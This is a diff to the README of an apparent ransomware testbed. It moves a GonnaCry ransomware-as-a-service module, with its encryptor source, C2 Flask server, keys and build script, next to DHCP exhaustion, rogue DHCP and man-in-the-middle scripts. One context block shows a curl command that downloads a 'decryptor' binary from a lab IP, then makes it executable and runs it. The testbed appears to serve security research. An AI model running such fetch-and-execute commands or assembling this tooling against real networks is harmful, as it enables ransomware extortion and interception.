@@ -83,21 +83,21 @@ Host Machine
 
 ```text
 RansomwareTestbed/
-├── attacks/                        Attack scripts (non-GonnaCry)
+├── attacks/                        Attack modules
+│   ├── GonnaCry/                   RaaS module
+│   │   ├── src/
+│   │   │   ├── GonnaCry/           Encryptor + decryptor Python source
+│   │   │   └── Server/             C2 Flask server
+│   │   │       ├── server.py
+│   │   │       ├── private_key.key
+│   │   │       ├── public_key.key
+│   │   │       └── binaries/       Pre-built ELF binaries (build on Ubuntu)
+│   │   ├── build_binaries.sh       PyInstaller build script (run on Ubuntu)
+│   │   └── keygen_server.py        RSA-2048 keypair generator
 │   ├── dhcp_attack_combined.sh     DHCP exhaustion + rogue DHCP (MitM)
 │   ├── dhcp_exhaustion.py
 │   ├── mitm_intercept.sh
 │   └── rogue_dhcp_server.sh
-├── GonnaCry/                       RaaS module (GonnaCry)
-│   ├── src/
-│   │   ├── GonnaCry/               Encryptor + decryptor Python source
-│   │   └── Server/                 C2 Flask server
-│   │       ├── server.py
-│   │       ├── private_key.key
-│   │       ├── public_key.key
-│   │       └── binaries/           Pre-built ELF binaries (build on Ubuntu)
-│   ├── build_binaries.sh           PyInstaller build script (run on Ubuntu)
-│   └── keygen_server.py            RSA-2048 keypair generator
 ├── configs/
 │   ├── firewall/
 │   │   └── gateway.nft
@@ -464,7 +464,7 @@ curl -s http://173.168.0.50/download-decryptor/ -o /tmp/decryptor \
   && chmod +x /tmp/decryptor && /tmp/decryptor
 ```
 
-See `GonnaCry/README.md` for full architecture, keypair setup, and binary build instructions.
+See `attacks/GonnaCry/README.md` for full architecture, keypair setup, and binary build instructions.
 
 ---
 
